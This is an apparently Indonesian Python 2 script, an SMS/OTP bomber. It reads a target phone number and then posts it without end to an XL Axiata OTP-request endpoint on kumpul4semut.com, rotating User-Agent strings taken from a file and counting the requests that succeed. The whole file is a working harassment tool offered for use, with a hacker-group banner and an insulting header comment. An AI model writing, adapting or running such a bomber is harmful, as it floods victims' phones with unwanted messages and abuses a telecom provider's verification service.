#_*_coding=UTF-8_*_
# Mau Ngapain? Mau Recode?
# Ya Usaha Sendiri Lah Goblok
# Ini Hasil Sendiri Bukan Hasil Recode -_-
import requests,sys,random
def banner():
	print ("""\033[32;1m
███████╗ ██╗  ██╗ ██╗  \033[33;1m   Author\033[31;1m:\033[37;1m Billal\033[32;1m
██╔════╝ ╚██╗██╔╝ ██║  \033[33;1m   Form\033[31;1m:\033[37;1m XL Axiata\033[32;1m
███████╗  ╚███╔╝  ██║  \033[31;1m       :\033[37;1m Kumpul4Semut\033[32;1m
╚════██║  ██╔██╗  ██║  \033[31;1m       :\033[37;1m Rusmana ID\033[32;1m
███████║ ██╔╝ ██╗ ███████╗\033[31;1m    :\033[37;1m Dan Kalian\033[32;1m
╚══════╝ ╚═╝  ╚═╝ ╚══════╝\033[33;1mMyYT\033[31;1m: \033[37;1mWoll Cyber Team\033[31;1m
         CTRL + C\033[37;1m untuk keluar\033[0m
""")
def show(type,text=None,no=None,jumlah=None):
	if int(type)==1:
		print ("\033[33;1m{\033[31;1mERROR\033[33;1m}> \033[31;1m"+str(text))
		sys.exit()
	elif int(type)==2:
		print ("\033[33;1m{\033[32;1m!\033[33;1m}> Sukses ")

	elif int(type)==3:
		print ("\033[33;1m{\033[31;1m*\033[33;1m}> Gagal")

def rand_user():
	f = ""
	try:
		f = open("user.txt","r").read()
	except IOError:
		show(1,"Fatal Error: file not found")
	rand = random.choice(f.splitlines())
	return "".join(rand)

def spam(nomor):
	b = 0
	g = 0
	while True:
		try:
			url = "https://www.kumpul4semut.com/stores/xl/req_otp"
			data = {"msisdn":nomor}
			ua = rand_user()
			head = {"User-Agent":ua}
			r = ""
			try:
				r = requests.post(url,data=data,headers=head)
			except requests.exceptions.ConnectionError:
				show(1,"Fatal Eror: connection ERROR")
			if "Success" in r.content:
				b += 1
				show(2,nomor)
			else:
				g += 1
				show(3,nomor)
		except (KeyboardInterrupt):
			show(1,"Keluar Program\033[0m")
			break
			sys.exit()
banner()
try:
	no = int(raw_input("\033[33;1m{?} Nomor HP\033[31;1m:\033[32;1m "))
except:
	print ("")
	show(1,"Please Input Numbers\033[0m")
	sys.exit()
spam(no)
